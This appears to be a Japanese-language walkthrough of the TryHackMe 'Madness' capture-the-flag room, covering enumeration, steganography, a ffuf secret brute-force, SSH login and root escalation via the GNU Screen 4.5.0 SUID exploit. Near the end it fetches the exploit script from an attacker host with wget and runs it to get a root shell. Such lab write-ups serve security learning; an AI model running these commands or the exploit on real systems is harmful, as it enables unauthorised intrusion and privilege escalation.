# Madness CTF

https://tryhackme.com/r/room/madness

SSHブルートフォースは不要という注意書きがある

## Enumeration

### ポートスキャン

```shell
root@ip-10-10-182-115:~# TARGET=10.10.67.75

root@ip-10-10-182-115:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-01 06:51 GMT
Nmap scan report for 10.10.67.75
Host is up (0.00043s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:CD:1D:EB:CF:75 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.85 seconds

root@ip-10-10-182-115:~# sudo nmap -sV -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-01 06:52 GMT
Nmap scan report for 10.10.67.75
Host is up (0.00015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 02:CD:1D:EB:CF:75 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds
```

### gobuster

```shell
root@ip-10-10-182-115:~# gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.67.75
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 276]
Progress: 220557 / 220558 (100.00%)
===============================================================
Finished
===============================================================

root@ip-10-10-182-115:~# gobuster dir -x php,txt,html -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.67.75
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/.html                (Status: 403) [Size: 276]
/index.php            (Status: 200) [Size: 11320]
/.html                (Status: 403) [Size: 276]
/.php                 (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
Progress: 882228 / 882232 (100.00%)
===============================================================
Finished
===============================================================
```

```html
  <body>
    <div class="main_page">
      <div class="page_header floating_element">
        <img src="thm.jpg" class="floating_element"/>
<!-- They will never find me-->
        <span class="floating_element">
          Apache2 Ubuntu Default Page
        </span>
      </div>
```

## thm.jpg

```shell
$ wget http://10.10.67.75/thm.jpg                  

$ file ./thm.jpg 
./thm.jpg: data
```

jpgではない、何かのデータファイル。

```shell
$ exiftool ./thm.jpg                                                            ExifTool Version Number         : 12.76
File Name                       : thm.jpg
Directory                       : .
File Size                       : 22 kB
File Modification Date/Time     : 2020:01:06 05:34:26-05:00
File Access Date/Time           : 2025:01:01 02:05:40-05:00
File Inode Change Date/Time     : 2025:01:01 02:05:34-05:00
File Permissions                : -rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Warning                         : PNG image did not start with IHDR
```

exiftoolでは、pngと判定されている。

```shell
$ pngcheck -vtp7 thm.png 
zlib warning:  different version (expected 1.2.13, using 1.3.1)

File: thm.png (22210 bytes)
  invalid chunk name "" (01 00 00 01)
ERRORS DETECTED in thm.png
```

チャンク名が不正。  
PNGの仕様を調べたところ正しいPNGに修正するのは無理と判断し、JPEGヘッダーに変える。

```text
File: ./thm.jpg                                                        ASCII Offset: 0x00000000 / 0x000056C1 (%00)   
00000000  89 50 4E 47  0D 0A 1A 0A   00 00 00 01  01 00 00 01
```

```text
File: ./thm.jpg                                                                                                                                                                              ASCII Offset: 0x00000000 / 0x000056C1 (%00)   
00000000  FF D8 FF E0  00 10 4A 46   49 46 00 01  01 00 00 01
```

画像を開くと、隠しディレクトリが表示された。  


## /th1s_1s_h1dd3n

```html
<html>
<head>
  <title>Hidden Directory</title>
  <link href="stylesheet.css" rel="stylesheet" type="text/css">
</head>
<body>
  <div class="main">
<h2>Welcome! I have been expecting you!</h2>
<p>To obtain my identity you need to guess my secret! </p>
<!-- It's between 0-99 but I don't think anyone will look here-->

<p>Secret Entered: </p>

<p>That is wrong! Get outta here!</p>

</div>
</body>
</html>
```

0から99の範囲の正しいシークレットを調べる。

```shell
seq 0 99 > num.txt
$ ffuf -w num.txt -u "http://10.10.243.48/th1s_1s_h1dd3n/?secret=FUZZ"  -fr "That is wrong"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.243.48/th1s_1s_h1dd3n/?secret=FUZZ
 :: Wordlist         : FUZZ: /home/kali/CTF/num.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: That is wrong
________________________________________________

73                      [Status: 200, Size: 445, Words: 53, Lines: 19, Duration: 268ms]
:: Progress: [100/100] :: Job [1/1] :: 21 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

73がヒット。

```html
<html>
<head>
  <title>Hidden Directory</title>
  <link href="stylesheet.css" rel="stylesheet" type="text/css">
</head>
<body>
  <div class="main">
<h2>Welcome! I have been expecting you!</h2>
<p>To obtain my identity you need to guess my secret! </p>
<!-- It's between 0-99 but I don't think anyone will look here-->

<p>Secret Entered: 73</p>

<p>Urgh, you got it right! But I won't tell you who I am! y2RPJ4QaPF!B</p>

</div>
</body>
</html>
```

y2RPJ4QaPF!B  
これはパスワードだけどユーザー名は教えないということらしい。  

パスワードを使って、steghide で開けた。

```shell
$ steghide --extract -sf ./thm.jpg   
Enter passphrase: 
wrote extracted data to "hidden.txt".
                                                                                                                                                                                                                                           
$ ls
hidden.txt  images.png  num.txt  thm.jpg  thm.jpg-org
                                                                                                                                                                                                                                           
$ cat ./hidden.txt
Fine you found the password! 

Here's a username 

wbxre

I didn't say I would make it easy for you!
```

## ユーザー名：wbxre

wbxre / y2RPJ4QaPF!B  
wbxre / 73  
ではSSHに入れなかった。

ユーザー名が分かったので普通ならSSHブルートフォースするけど、注意書きにSSHブルートフォース不要と書かれてるので、何か隠されていると思われる。

th1s_1s_h1dd3n ディレクトリの中を探索

```shell
root@ip-10-10-180-30:~# gobuster dir -x php,txt,html,jpg -u http://10.10.243.48/th1s_1s_h1dd3n -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.243.48/th1s_1s_h1dd3n
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,jpg,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 406]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
Progress: 1102785 / 1102790 (100.00%)
===============================================================
Finished
===============================================================
```

特になし。

```shell
$ echo wbxre   | tr 'A-Za-z' 'N-ZA-Mn-za-m'                                                                                                                                  
joker
```

Rot13でjokerになった。これが本当のユーザー名？

joker / y2RPJ4QaPF!B  
でもSSHに入れない。

ルームにある画像を展開できた。（パスワード無し）

```shell
$ steghide --extract -sf ./5iW7kC8.jpg
Enter passphrase: 
wrote extracted data to "password.txt".
                                                                                                                                                                                                                                           
$ ls
5iW7kC8.jpg  hidden.txt  hydra.restore  images.png  num.txt  password.txt  thm.jpg  thm.jpg-org
                                                                                                                                                                                                                                           
$ cat ./password.txt
I didn't think you'd find me! Congratulations!

Here take my password

*axA&GF8dP
```

### SSH

joker / *axA&GF8dP で入れた。

```shell
$ ssh joker@10.10.26.235              
The authenticity of host '10.10.26.235 (10.10.26.235)' can't be established.
ED25519 key fingerprint is SHA256:B0gcnLQ9MrwK4uUZINN4JI6gd+EofSsF2e8c5ZMDrwY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:13: [hashed name]
    ~/.ssh/known_hosts:14: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.26.235' (ED25519) to the list of known hosts.
joker@10.10.26.235's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-170-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sun Jan  5 18:51:33 2020 from 192.168.244.128
joker@ubuntu:~$ 
```

```shell
joker@ubuntu:~$ ls
user.txt
joker@ubuntu:~$ cat ./user.txt 
THM{}
```

フラグゲット。

## 権限昇格

### sudo
なし
```shell
joker@ubuntu:~$ sudo -l
[sudo] password for joker: 
Sorry, user joker may not run sudo on ubuntu.
```

### UID

```shell
joker@ubuntu:~$ find / -perm -u=s -type f -ls 2>/dev/null
   787179    420 -rwsr-xr-x   1 root     root       428240 Mar  4  2019 /usr/lib/openssh/ssh-keysign
   783573     44 -rwsr-xr--   1 root     messagebus    42992 Nov 29  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   783720     12 -rwsr-xr-x   1 root     root          10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
   796786     12 -rwsr-xr-x   1 root     root          10624 May  8  2018 /usr/bin/vmware-user-suid-wrapper
   786837     76 -rwsr-xr-x   1 root     root          75304 Mar 26  2019 /usr/bin/gpasswd
   786836     56 -rwsr-xr-x   1 root     root          54256 Mar 26  2019 /usr/bin/passwd
   788345     40 -rwsr-xr-x   1 root     root          39904 Mar 26  2019 /usr/bin/newgrp
   786840     40 -rwsr-xr-x   1 root     root          40432 Mar 26  2019 /usr/bin/chsh
   786835     72 -rwsr-xr-x   1 root     root          71824 Mar 26  2019 /usr/bin/chfn
   785350    136 -rwsr-xr-x   1 root     root         136808 Oct 11  2019 /usr/bin/sudo
   139061     32 -rwsr-xr-x   1 root     root          30800 Jul 12  2016 /bin/fusermount
   151721     40 -rwsr-xr-x   1 root     root          40128 Mar 26  2019 /bin/su
   130636     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /bin/ping6
   150852   1552 -rwsr-xr-x   1 root     root        1588648 Jan  4  2020 /bin/screen-4.5.0
   150850   1552 -rwsr-xr-x   1 root     root        1588648 Jan  4  2020 /bin/screen-4.5.0.old
   130620     40 -rwsr-xr-x   1 root     root          40152 Oct 10  2019 /bin/mount
   130635     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /bin/ping
   130585     28 -rwsr-xr-x   1 root     root          27608 Oct 10  2019 /bin/umount
```

### screen-4.5 exploit

```shell
$ searchsploit screen           
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
GNU Screen 4.5.0 - Local Privilege Escalation                                                                                                                                                            | linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                                                                                                                                      | linux/local/41152.txt
```

エクスプロイト

```shell
joker@ubuntu:~$ wget http://10.2.22.182/41154.sh

joker@ubuntu:~$ chmod +x ./41154.sh

joker@ubuntu:~$ ./41154.sh 
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function ‘dropshell’:
/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
     chmod("/tmp/rootshell", 04755);
     ^
/tmp/rootshell.c: In function ‘main’:
/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
     setuid(0);
     ^
/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
     setgid(0);
     ^
/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
     seteuid(0);
     ^
/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
     setegid(0);
     ^
/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
     execvp("/bin/sh", NULL, NULL);
     ^
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-joker.

# id
uid=0(root) gid=0(root) groups=0(root),1000(joker)

# ls /root
root.txt
# cat /root/root.txt
THM{}
```

ルートフラグゲット！

## 振り返り
- あまりセキュリティの勉強にはならない内容
- ルームの画像に隠されてるパターン
- screen4.5はなかなか気づかなかった
